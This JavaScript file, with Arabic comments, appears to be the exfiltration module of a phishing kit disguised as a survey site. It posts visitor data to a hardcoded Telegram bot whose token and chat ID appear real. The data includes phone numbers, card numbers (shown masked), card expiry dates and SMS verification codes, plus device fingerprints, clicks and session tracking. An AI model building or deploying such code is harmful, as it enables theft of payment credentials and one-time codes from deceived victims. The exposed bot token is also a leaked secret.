// إعدادات بوت تليجرام - غيرها بمعلوماتك الحقيقية
const TELEGRAM_BOT_TOKEN = '8518960519:AAG0za12-lmN0luUwoR1BGB0wwRdfP94vYY'; // مثال: 1234567890:V6RwUYQ7p8Q9rS1t2u3v4w5x6
const TELEGRAM_CHAT_ID = '8421252546'; // مثال: 123456789

// إرسال البيانات إلى تليجرام
async function sendTelegramData(eventType, data) {
    try {
        console.log(`📤 محاولة إرسال حدث: ${eventType}`);
        
        // التحقق من إعدادات تليجرام
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'ضع_التوكن_هنا' || 
            !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'ضع_Chat_ID_هنا') {
            console.warn('⚠️ إعدادات تليجرام غير مكتملة');
            console.warn('📋 افتح telegram.js وغير المعلومات بمعلومات بوتك');
            console.warn('💡 للاختبار: إرجاع true للاستمرار');
            return true; // للاختبار فقط
        }
        
        const message = formatTelegramMessage(eventType, data);
        
        // إعداد طلب HTTP
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_notification: false
        };
        
        console.log(`🔗 الإرسال إلى: ${url.substring(0, 50)}...`);
        
        // إرسال البيانات
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
        
        const responseData = await response.json();
        
        if (responseData.ok) {
            console.log('✅ تم الإرسال بنجاح إلى تليجرام');
            return true;
        } else {
            console.error('❌ خطأ من تليجرام:', responseData.description);
            
            // رسائل خطأ مفيدة
            if (responseData.description.includes('bot token')) {
                console.error('🔑 التوكن غير صحيح! تحقق من التوكن في telegram.js');
            }
            if (responseData.description.includes('chat not found')) {
                console.error('💬 Chat ID غير صحيح! تأكد أنه رقم وليس @username');
            }
            if (responseData.description.includes('bot was blocked')) {
                console.error('🚫 البوت محظور! ابدأ محادثة مع البوت أولاً');
            }
            
            return false;
        }
        
    } catch (error) {
        console.error('❌ خطأ في اتصال تليجرام:', error.message);
        
        if (error.message.includes('Failed to fetch')) {
            console.error('🌐 مشكلة في الاتصال بالإنترنت أو CORS');
        }
        
        return false;
    }
}

// تنسيق رسالة تليجرام
function formatTelegramMessage(eventType, data) {
    const timestamp = new Date().toISOString();
    let message = `<b>📊 ${getEventTypeName(eventType)}</b>\n`;
    message += `⏰ <b>الوقت:</b> ${formatTime(timestamp)}\n`;
    message += `🆔 <b>معرف الجلسة:</b> ${data.sessionId || getSessionId() || 'غير معروف'}\n\n`;
    
    switch(eventType) {
        case 'session_started':
            message += `🌐 <b>المرجع:</b> ${data.referrer || 'مباشر'}\n`;
            message += `🕒 <b>وقت البدء:</b> ${formatTime(data.startTime)}\n`;
            break;
            
        case 'page_view':
            message += `📄 <b>الصفحة:</b> ${data.page}\n`;
            message += `⏱️ <b>مدة الجلسة:</b> ${formatDuration(data.sessionDuration)}\n`;
            message += `📍 <b>موضع التمرير:</b> ${data.scrollPosition}px\n`;
            break;
            
        case 'button_click':
            message += `🖱️ <b>زر:</b> ${data.text}\n`;
            message += `🔗 <b>ID:</b> ${data.id}\n`;
            message += `📄 <b>الصفحة:</b> ${data.page}\n`;
            message += `📍 <b>الإحداثيات:</b> X:${data.x}, Y:${data.y}\n`;
            break;
            
        case 'specific_button_click':
            message += `🖱️ <b>زر محدد:</b> ${data.buttonId}\n`;
            message += `📄 <b>الصفحة:</b> ${data.page}\n`;
            message += `⏱️ <b>مدة الجلسة:</b> ${formatDuration(data.sessionDuration)}\n`;
            break;
            
        case 'touch_event':
            message += `👆 <b>لمسات:</b> ${data.touches}\n`;
            message += `📍 <b>الإحداثيات:</b> X:${data.x}, Y:${data.y}\n`;
            message += `📄 <b>الصفحة:</b> ${data.page}\n`;
            break;
            
        case 'step1_completed':
            message += `📱 <b>رقم الهاتف:</b> ${data.phone}\n`;
            message += `💳 <b>رقم البطاقة:</b> ${maskCardNumber(data.cardNumber)}\n`;
            message += `📅 <b>تاريخ الانتهاء:</b> ${data.expiryDate}\n`;
            message += `✅ <b>تم إكمال الخطوة الأولى</b>\n`;
            break;
            
        case 'survey_completed':
            message += `🎉 <b>تم إكمال الاستبيان!</b>\n\n`;
            message += `<b>📊 معلومات المستخدم:</b>\n`;
            message += `📱 <b>الهاتف:</b> ${data.phone}\n`;
            message += `💳 <b>البطاقة:</b> ${maskCardNumber(data.cardNumber)}\n`;
            message += `🔢 <b>كود التحقق:</b> ${data.verificationCode}\n\n`;
            message += `<b>🖥️ معلومات الجهاز:</b>\n`;
            if (data.deviceInfo) {
                message += `📱 <b>النوع:</b> ${data.deviceInfo.deviceType || 'غير معروف'}\n`;
                message += `⚙️ <b>نظام التشغيل:</b> ${data.deviceInfo.os || 'غير معروف'}\n`;
                message += `🌐 <b>المتصفح:</b> ${data.deviceInfo.browser || 'غير معروف'}\n`;
                message += `📐 <b>الدقة:</b> ${data.deviceInfo.screenWidth || 0}×${data.deviceInfo.screenHeight || 0}\n`;
                message += `🗣️ <b>اللغة:</b> ${data.deviceInfo.language || 'غير معروف'}\n`;
            }
            break;
            
        case 'session_ended':
            message += `👋 <b>انتهت الجلسة</b>\n`;
            message += `⏱️ <b>المدة:</b> ${formatDuration(data.duration)}\n`;
            message += `📊 <b>مشاهدات الصفحات:</b> ${data.pageViews}\n`;
            message += `🔄 <b>عدد الإجراءات:</b> ${data.actionsCount}\n`;
            break;
            
        case 'user_actions_summary':
            message += `📈 <b>ملخص الإجراءات:</b>\n`;
            if (data.actions && data.actions.length > 0) {
                data.actions.forEach((action, index) => {
                    message += `${index + 1}. ${getActionDescription(action)}\n`;
                });
            }
            break;
            
        default:
            message += `📝 <b>البيانات:</b> ${JSON.stringify(data, null, 2).substring(0, 1000)}\n`;
    }
    
    message += `\n────────────────────\n`;
    message += `<i>📱 تم الإرسال من موقع الاستبيان</i>`;
    
    return message;
}

// وظائف مساعدة للتنسيق
function getEventTypeName(eventType) {
    const names = {
        'session_started': 'بداية جلسة جديدة',
        'page_view': 'مشاهدة صفحة',
        'button_click': 'نقر على زر',
        'specific_button_click': 'نقر زر محدد',
        'touch_event': 'لمس الشاشة',
        'step1_completed': 'إكمال الخطوة الأولى',
        'survey_completed': 'إكمال الاستبيان',
        'session_ended': 'نهاية الجلسة',
        'user_actions_summary': 'ملخص إجراءات المستخدم',
        'thankyou_page_viewed': 'مشاهدة صفحة الشكر'
    };
    
    return names[eventType] || eventType;
}

function formatTime(isoString) {
    try {
        const date = new Date(isoString);
        return date.toLocaleString('ar-SA', {
            timeZone: 'Africa/Algiers',
            hour12: true,
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    } catch (error) {
        return isoString;
    }
}

function formatDuration(ms) {
    if (!ms || ms <= 0) return '0 ثانية';
    
    const seconds = Math.floor(ms / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);
    
    if (hours > 0) {
        return `${hours} ساعة ${minutes % 60} دقيقة`;
    } else if (minutes > 0) {
        return `${minutes} دقيقة ${seconds % 60} ثانية`;
    } else {
        return `${seconds} ثانية`;
    }
}

function maskCardNumber(cardNumber) {
    if (!cardNumber) return 'غير معروف';
    const cleanNumber = cardNumber.replace(/\s/g, '');
    if (cleanNumber.length < 4) return '****';
    return `**** **** **** ${cleanNumber.slice(-4)}`;
}

function getActionDescription(action) {
    if (!action || !action.type) return 'إجراء غير معروف';
    
    switch(action.type) {
        case 'page_view':
            return `صفحة: ${action.data?.page || 'غير معروف'}`;
        case 'button_click':
            return `نقر: ${action.data?.text || 'غير معروف'}`;
        case 'touch_event':
            return `لمس: ${action.data?.touches || 0} إصبع`;
        default:
            return action.type;
    }
}

// دالة لفحص إعدادات تليجرام
function checkTelegramSetup() {
    console.log('🔍 فحص إعدادات تليجرام...');
    
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'ضع_التوكن_هنا') {
        console.error('❌ لم يتم تعيين Bot Token');
        console.info('📋 التعليمات:');
        console.info('1. ابحث عن @BotFather في تليجرام');
        console.info('2. أنشئ بوت جديد عبر /newbot');
        console.info('3. احصل على التوكن (شكل: 123456:ABC-DEF...)');
        console.info('4. ضع التوكن في telegram.js مكان "ضع_التوكن_هنا"');
        return false;
    }
    
    if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'ضع_Chat_ID_هنا') {
        console.error('❌ لم يتم تعيين Chat ID');
        console.info('📋 التعليمات:');
        console.info('1. ابحث عن @userinfobot في تليجرام');
        console.info('2. أرسل /start');
        console.info('3. احصل على رقمك (Your ID: 123456789)');
        console.info('4. ضع الرقم في telegram.js مكان "ضع_Chat_ID_هنا"');
        return false;
    }
    
    console.log('✅ إعدادات تليجرام جاهزة');
    console.log(`🤖 البوت: ${TELEGRAM_BOT_TOKEN.substring(0, 10)}...`);
    console.log(`💬 الدردشة: ${TELEGRAM_CHAT_ID}`);
    
    return true;
}

// عند تحميل الملف
console.log('🤖 Telegram.js loaded - جاهز للإرسال');
